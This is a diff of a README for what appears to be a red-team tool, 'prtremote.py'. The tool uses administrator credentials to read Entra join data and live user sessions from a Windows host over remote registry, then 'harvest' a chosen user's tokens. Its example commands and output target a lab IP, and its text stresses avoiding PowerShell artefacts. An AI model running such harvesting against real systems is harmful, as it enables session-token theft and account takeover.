@@ -21,7 +21,7 @@ Requires `impacket` and `requests`.
 Reads over MS-RRP: Entra registration (`HKLM\SYSTEM\...\CloudDomainJoin\JoinInfo`) and live sessions (hives loaded under `HKEY_USERS`, named via `ProfileList`). Starts RemoteRegistry if stopped and restores it after.
 
 ```bash
-python prtremote.py check 'ENDPOINT/Administrator:Passw0rd!@192.168.122.64'
+python prtremote.py check ENDPOINT/Administrator:"$PASSWORD"@192.168.122.64
 ```
 
 ```
@@ -34,7 +34,7 @@ python prtremote.py check 'ENDPOINT/Administrator:Passw0rd!@192.168.122.64'
 [*] Live sessions ........ 1
 [*]   achen .............. S-1-12-1-1234567890-...
 
-[*] Harvest with: prtremote.py dump ENDPOINT/Administrator:Passw0rd!@192.168.122.64 -run-user achen
+[*] Harvest with: prtremote.py dump ENDPOINT/Administrator:"$PASSWORD"@192.168.122.64 -run-user achen
 ```
 
 ## `prtremote.py dump`
@@ -52,7 +52,7 @@ Nothing of ours executes: no `powershell.exe -EncodedCommand`, no script-block o
 `-run-user`'s domain prefix is optional.
 
 ```bash
-python prtremote.py dump 'ENDPOINT/Administrator:Passw0rd!@192.168.122.64' -run-user achen
+python prtremote.py dump ENDPOINT/Administrator:"$PASSWORD"@192.168.122.64 -run-user achen
 ```
 
 ```
